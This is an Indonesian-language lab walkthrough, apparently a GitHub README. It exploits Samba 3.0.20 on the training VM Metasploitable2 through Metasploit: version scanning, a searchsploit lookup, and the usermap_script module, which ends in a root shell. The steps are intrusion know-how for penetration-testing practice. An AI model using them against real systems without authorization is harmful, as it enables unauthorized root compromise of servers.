# Exploit port 139 dan 445 (SMB)
- Buka msfconsole di terminal
```sh
msfconsole
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%201.JPG)

- Gunakan modul `auxiliary/scanner/smb/smb_version` untuk mengetahui versi samba yang digunakan di server
```sh
use auxiliary/scanner/smb/smb_version
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%202.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini kita hanya perlu mengisi parameter `RHOSTS` saja
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%203.JPG)

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%204.JPG)

- Jalankan modul tersebut. Disini didapat informasi bahwa file server yang digunakan adalah samba versi `3.0.20`
```sh
exploit
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%205.JPG)

- Buka terminal baru gunakan tool searchsploit untuk mencari kelemahan samba versi `3.0.20`
```sh
searchsploit samba
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%206.JPG)

- Buka kembali tool metasploit dan lakukan pencarian modul exploit untuk samba
```sh
search samba
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%207.JPG)

- Disini kita gunakan modul `exploit/multi/samba/usermap_script` yang ada di list nomor 8 dari hasil pencarian
```sh
use <nomor_modul>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%208.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%209.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini kita hanya perlu mengisi parameter `RHOSTS` saja
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%2010.JPG)

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%2011.JPG)

- Jalankan modul tersebut. Setelah dijalankan, exploit berhasil mengakses masuk ke dalam server. Jika diketik perintah whoami maka kita berhasil masuk sebagai user root
```sh
exploit
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMB/smb%2012.JPG)